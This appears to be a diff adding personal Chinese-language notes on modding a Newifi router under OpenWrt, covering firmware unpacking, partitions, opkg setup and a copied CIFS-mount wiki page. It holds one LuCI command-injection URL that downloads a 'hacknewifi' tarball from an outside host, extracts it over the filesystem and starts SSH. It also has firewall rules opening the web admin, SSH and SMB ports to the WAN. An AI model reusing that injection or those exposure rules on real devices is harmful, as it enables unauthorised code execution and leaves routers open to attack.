@@ -1,0 +1,206 @@
+
+------------------------------------------------------------------------------
+ squashfs解包及压缩
+------------------------------------------------------------------------------
+ 1. 用binwalk找到固件的squashfs的偏移量地址和字节大小. 
+ 2. 用dd命令将squashfs提取出来,并用unsquashfs解压缩. 
+ 3. 修改完固件后, 一定要用openwrt的/host/bin/mksquashfs4进行压缩打包(详细参数到openwrt的Makefile文件中查找) . 
+ 4.最后用dd命令将打包好的squashfs文件覆盖原来固件中squashfs内容.
+------------------------------------------------------------------------------
+
+d777b7dd779ecf93d1aea2035abfacd0
+192.168.99.1/cgi-bin/luci/;stok=6a057cffe125898aa4a561f3e864f74c/admin/xcloud/comcmd?cmd=wget%20-O-%20http://xunkutech.qiniudn.com/hacknewifi.tar.gz|tar%20-C%20/%20-zxvf-%26%26/etc/init.d/dropbear%20start
+6a057cffe125898aa4a561f3e864f74c
+	kernel (= 3.10.49-1-3df3ab26a49a04478a9633bf83827ca3) * 
+------------------------------------------------------------------------------
+Package: kernel
+Version: 3.4.56-1-69d228bbfeeadcf87f28e08d031279ba
+Depends: libc
+Provides:
+Status: install hold installed
+Architecture: ralink
+Installed-Time: 1413274024
+------------------------------------------------------------------------------
+
+查看当前系统分区：
+root@newifi:/usr# cat /proc/mtd
+dev:    size   erasesize  name
+mtd0: 00030000 00010000 "u-boot"
+mtd1: 00010000 00010000 "u-boot-env"
+mtd2: 00010000 00010000 "Factory"
+mtd3: 01000000 00010000 "fullflash"
+mtd4: 00fb0000 00010000 "firmware"
+mtd5: 000f0000 00010000 "kernel"
+mtd6: 00ec0000 00010000 "rootfs"
+mtd7: 00430000 00010000 "rootfs_data"
+
+root@newifi:/usr# cat /proc/partitions 
+major minor  #blocks  name
+
+  31        0        192 mtdblock0
+  31        1         64 mtdblock1
+  31        2         64 mtdblock2
+  31        3      16384 mtdblock3
+  31        4      16064 mtdblock4
+  31        5        960 mtdblock5
+  31        6      15104 mtdblock6
+  31        7       4288 mtdblock7
+
+每个分区在flash中的位置是/dev/mtdblockX这样的位置,比如你想把art分区里的数据读出来看看，那么就执行：
+root@newifi:/dev# dd if=/dev/mtdblock4 of=/tmp/1
+32128+0 records in
+32128+0 records out
+
+然后执行hexdump -C /tmp/1就可以看到这个分区的内容了。
+
+================================================================================
+
+接下来，我给大家介绍一下如何利用官网编译好的文件包安装OpenWrt插件。
+首先，ssh登录Y1S后台，修改opkg包管理器配置文件
+
+    mv /etc/opkg.conf /etc/opkg.conf.orig
+    cat > /etc/opkg.conf <<EOF
+    src/gz attitude_adjustment http://downloads.openwrt.org/barrier_breaker/14.07-rc3/ramips/mt7620a/packages
+    dest root /
+    dest ram /tmp
+    lists_dir ext /var/opkg-lists
+    option overlay_root /overlay
+    arch all 1
+    arch noarch 1
+    arch ralink 10
+    arch ramips_24kec 20
+    EOF
+
+复制代码
+
+
+接着，更新软件列表：
+
+    opkg update
+
+复制代码
+
+
+最后，安装一个软件试试：
+
+    opkg install openssh-sftp-server
+
+复制代码
+
+
+不出意外的话，Y1S就具备文件sftp文件上传下载能力了。
+
+================================================================================
+三、启用外网Web、SSH管理及Samba访问，执行以下命令：
+================================================================================
+
+1、启用外网Web管理
+uci show firewall
+uci add firewall rule
+uci set firewall.@rule[8].name=LuCI
+uci set firewall.@rule[8].src=wan
+uci set firewall.@rule[8].proto=tcp
+uci set firewall.@rule[8].dest_port=80
+uci set firewall.@rule[8].target=ACCEPT
+uci commit
+
+2、启用外网SSH管理
+uci show firewall
+uci add firewall rule
+uci set firewall.@rule[9].name=SSH
+uci set firewall.@rule[9].src=wan
+uci set firewall.@rule[9].proto=tcp
+uci set firewall.@rule[9].dest_port=22
+uci set firewall.@rule[9].target=ACCEPT
+uci commit
+
+3、启用外网Samba访问        
+uci show firewall
+uci add firewall rule
+uci set firewall.@rule[10].name=Samba_1
+uci set firewall.@rule[10].src=wan
+uci set firewall.@rule[10].proto=tcp
+uci set firewall.@rule[10].dest_port=445
+uci set firewall.@rule[10].target=ACCEPT
+uci add firewall rule
+uci set firewall.@rule[11].name=Samba_2
+uci set firewall.@rule[11].src=wan
+uci set firewall.@rule[11].proto=tcp
+uci set firewall.@rule[11].dest_port=8200
+uci set firewall.@rule[11].target=ACCEPT
+uci commit
+
+4、重启防火墙，使配置生效
+/etc/init.d/firewall restart
+
+把电脑接回主路由，就能访问mini了（主路由分配给mini的IP地址，也就是mini的WAN口地址）
+
+================================================================================
+CIFS ClientDescription
+================================================================================
+
+Common Internet File System (CIFS) allows you to mount networked drives. You'll need a Internet connection for downloading the packages and a computer with CIFS/SAMBA server with some shares.
+Note1: cifs mount is not compatible with luci (see #10366)
+Note2: In r31584 the package cifsmount was replaced with cifs-utils
+Packages
+
+	* 
+kmod-fs-cifs Package is required for the actual mounting of cifs drives.
+
+	* 
+cifsmount contains a helper program mount.cifs which can be used instead of mount -t cifs command. Personal note: On Backfire 10.03.1-rc6, I observed that cifsmount is necessary (in addition to kmod-fs-cifs). "mount -t cifs" fails without cifsmount.
+
+	* 
+kmod-nls-utf8 Native language support-Package is required for anonymous/guest access to cifs mounts. Otherwise, "mount error 83 = Can not access a needed shared library" results.
+
+
+InstallRequired
+
+opkg install kmod-fs-cifs
+
+
+Optional
+
+opkg install kmod-nls-utf8 kmod-nls-base kmod-crypto-hmac kmod-crypto-md5 kmod-crypto-misc cifsmount
+
+
+Note: kmod-crypto-misc for md4-hash algorithm — ivang 2011/11/06 22:12
+Examples
+Basic example of authenticated share.
+mount -t cifs //cifs-server/share /localfolder -o user=username,password=password
+
+Same as above, but specifies more options
+mount -t cifs //cifs-server/share /localfolder -o unc=\\\\cifs-server\\share,ip=IP-Address,user=john,pass=doe,dom=workgroup
+
+Anonymous or guest share mounting.
+mount -t cifs '\\cifs-server\share' /localfolder -o guest,iocharset=utf8,file_mode=0777,dir_mode=0777,nounix,noserverino
+
+Anonymous or guest share mounting. If you have a problems with mounting CIFS with Anonymous or guest share try this. Its known bug/issue on kernel 3.8.x.
+
+mount.cifs //cifs-server/share /localfolder -o guest,sec=ntlm
+
+And for fstab.
+//cifs-server/share /localfolder cifs credentials=/etc/samba_pswds_my_share,_netdev,uid=user,gid=group 0 0
+
+where credentials file (chmod 0700) is formatted as
+
+username=shareuser
+password=sharepassword
+
+
+If the cifsmount package is installed the mount.cifs can be used be instead of mount -t cifs.
+Check manpage of mount.cifs
+Note: if you face the error "Value too large for defined data type", use the option "nounix,noserverino" as per Samba FAQ
+Throughput Issues
+Since netfilter will track every connection, if you use MASQUERADING for example, you could disable conntrack'ing for data connection:
+$IPT -t raw -A OUTPUT -o $IF_LAN -s $IP_LAN -p tcp --dport 139 -j CT --notrack #------------------ don't track SMB
+$IPT -t raw -A OUTPUT -o $IF_LAN -s $IP_LAN -p tcp --dport 445 -j CT --notrack #------------------ don't track SMB
+$IPT -t raw -A PREROUTING -o $IF_LAN -s $IP_LAN -p tcp --sport 139 -j CT --notrack #------------------ don't track SMB
+$IPT -t raw -A PREROUTING -o $IF_LAN -s $IP_LAN -p tcp --sport 445 -j CT --notrack #------------------ don't track SMB
+
+
+Note this is not the same as for the server, the source and destination ports differ. The INPUT is for when you read from the remote filesystem and the OUTPUT for when you write to it.
+NOTE: If you have problems
+Back to top
+doc/howto/cifs.client.txt · Last modified: 2014/07/21 10:24 by brakke
+
